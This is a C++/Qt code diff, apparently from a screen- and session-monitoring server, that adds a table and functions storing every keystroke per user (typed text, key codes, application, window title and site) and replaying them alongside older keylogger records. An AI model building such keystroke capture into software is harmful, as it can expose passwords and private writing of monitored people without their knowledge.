@@ -10,6 +10,8 @@
 #include <QSqlError>
 #include <QSqlQuery>
 #include <QSet>
+#include <limits>
+#include <QJsonObject>
 #include <QUrl>
 
 #include <algorithm>
@@ -450,6 +452,24 @@ bool HistoryRecorder::start(QString *error)
         "  stream_id INTEGER NOT NULL UNIQUE,"
         "  PRIMARY KEY (username, monitor_name)"
         ")"));
+
+    // Every keyboard event (node.exe keeps keyboard events, the viewer
+    // translates them): type 1 press / 2 auto-repeat / 3 release, the evdev
+    // code, the text the key produced, and the context.
+    query.exec(QStringLiteral(
+        "CREATE TABLE IF NOT EXISTS key_events ("
+        "  id INTEGER PRIMARY KEY AUTOINCREMENT,"
+        "  username TEXT NOT NULL,"
+        "  session_id INTEGER NOT NULL,"
+        "  moment_ms INTEGER NOT NULL,"
+        "  type INTEGER NOT NULL,"
+        "  code INTEGER NOT NULL,"
+        "  text TEXT NOT NULL,"
+        "  application TEXT NOT NULL,"
+        "  title TEXT NOT NULL,"
+        "  site TEXT NOT NULL"
+        ")"));
+    query.exec(QStringLiteral("CREATE INDEX IF NOT EXISTS idx_key_events_user_time ON key_events(username, moment_ms)"));
 
     // The keylogger chunk's first key and program (older rows: NULL).
     query.exec(QStringLiteral("ALTER TABLE keystrokes ADD COLUMN begin_ms INTEGER"));
@@ -1068,6 +1088,109 @@ void HistoryRecorder::recordKeystroke(quint32 sessionId, const QString &windowTi
         emit logMessage(
             QStringLiteral("Nu am putut scrie textul tastat: %1").arg(query.lastError().text()));
     }
+}
+
+void HistoryRecorder::recordKeyEvents(const QString &username, quint32 sessionId, const QJsonArray &events)
+{
+    if (!m_database.isOpen() || username.isEmpty() || events.isEmpty()) {
+        return;
+    }
+    m_database.transaction();
+    QSqlQuery insert(m_database);
+    insert.prepare(QStringLiteral(
+        "INSERT INTO key_events (username, session_id, moment_ms, type, code, text, application, title, site) "
+        "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"));
+    // A missing / empty field is a null QString, which binds as SQL NULL:
+    // store "" instead (modifiers and releases carry no text).
+    const auto text = [](const QJsonObject &event, const QString &key) {
+        const QString value = event.value(key).toString();
+        return value.isNull() ? QStringLiteral("") : value;
+    };
+    for (const QJsonValue &value : events) {
+        const QJsonObject event = value.toObject();
+        insert.addBindValue(username);
+        insert.addBindValue(sessionId);
+        insert.addBindValue(static_cast<qint64>(event.value(QStringLiteral("t")).toDouble()));
+        insert.addBindValue(event.value(QStringLiteral("k")).toInt());
+        insert.addBindValue(event.value(QStringLiteral("c")).toInt());
+        insert.addBindValue(text(event, QStringLiteral("x")));
+        insert.addBindValue(text(event, QStringLiteral("a")));
+        insert.addBindValue(text(event, QStringLiteral("w")));
+        insert.addBindValue(text(event, QStringLiteral("s")));
+        if (!insert.exec()) {
+            emit logMessage(QStringLiteral("Nu am putut scrie evenimentele tastaturii: %1").arg(insert.lastError().text()));
+            break;
+        }
+    }
+    m_database.commit();
+}
+
+QJsonArray HistoryRecorder::listKeyEvents(const QString &username, qint64 startMs, qint64 stopMs) const
+{
+    QJsonArray events;
+    if (!m_database.isOpen() || username.isEmpty()) {
+        return events;
+    }
+    // Where recording by events began for this user: older text chunks
+    // stand in only before it, so nothing is doubled.
+    qint64 eventsSince = std::numeric_limits<qint64>::max();
+    {
+        QSqlQuery first(m_database);
+        first.prepare(QStringLiteral("SELECT MIN(moment_ms) FROM key_events WHERE username = ?"));
+        first.addBindValue(username);
+        if (first.exec() && first.next() && !first.value(0).isNull()) {
+            eventsSince = first.value(0).toLongLong();
+        }
+    }
+    if (startMs < eventsSince) {
+        QSqlQuery chunks(m_database);
+        chunks.prepare(QStringLiteral(
+            "SELECT k.timestamp_ms, k.begin_ms, k.window_title, k.text, k.application FROM keystrokes k "
+            "WHERE k.session_id IN (SELECT DISTINCT session_id FROM frames WHERE session_username = ?) "
+            "AND k.timestamp_ms >= ? AND k.timestamp_ms < ? ORDER BY k.timestamp_ms ASC"));
+        chunks.addBindValue(username);
+        chunks.addBindValue(startMs);
+        chunks.addBindValue(qMin(stopMs, eventsSince));
+        if (chunks.exec()) {
+            while (chunks.next()) {
+                const qint64 end = chunks.value(0).toLongLong();
+                const qint64 begin = chunks.value(1).isNull() ? end : qMin(end, chunks.value(1).toLongLong());
+                const QString text = chunks.value(3).toString();
+                const int count = int(text.size());
+                for (int i = 0; i < count; ++i) {
+                    // The characters spread over the chunk, one press each
+                    // (code 0: the key is not known).
+                    const qint64 moment = count > 1 ? begin + (end - begin) * i / (count - 1) : end;
+                    events.append(QJsonObject{{QStringLiteral("t"), static_cast<double>(moment)},
+                                              {QStringLiteral("k"), 1},
+                                              {QStringLiteral("c"), 0},
+                                              {QStringLiteral("x"), QString(text.at(i))},
+                                              {QStringLiteral("a"), chunks.value(4).toString()},
+                                              {QStringLiteral("w"), chunks.value(2).toString()},
+                                              {QStringLiteral("s"), QString()}});
+                }
+            }
+        }
+    }
+    QSqlQuery query(m_database);
+    query.prepare(QStringLiteral(
+        "SELECT moment_ms, type, code, text, application, title, site FROM key_events "
+        "WHERE username = ? AND moment_ms >= ? AND moment_ms < ? ORDER BY moment_ms ASC, id ASC"));
+    query.addBindValue(username);
+    query.addBindValue(startMs);
+    query.addBindValue(stopMs);
+    if (query.exec()) {
+        while (query.next()) {
+            events.append(QJsonObject{{QStringLiteral("t"), static_cast<double>(query.value(0).toLongLong())},
+                                      {QStringLiteral("k"), query.value(1).toInt()},
+                                      {QStringLiteral("c"), query.value(2).toInt()},
+                                      {QStringLiteral("x"), query.value(3).toString()},
+                                      {QStringLiteral("a"), query.value(4).toString()},
+                                      {QStringLiteral("w"), query.value(5).toString()},
+                                      {QStringLiteral("s"), query.value(6).toString()}});
+        }
+    }
+    return events;
 }
 
 void HistoryRecorder::setCategory(const QString &application, const QString &category)
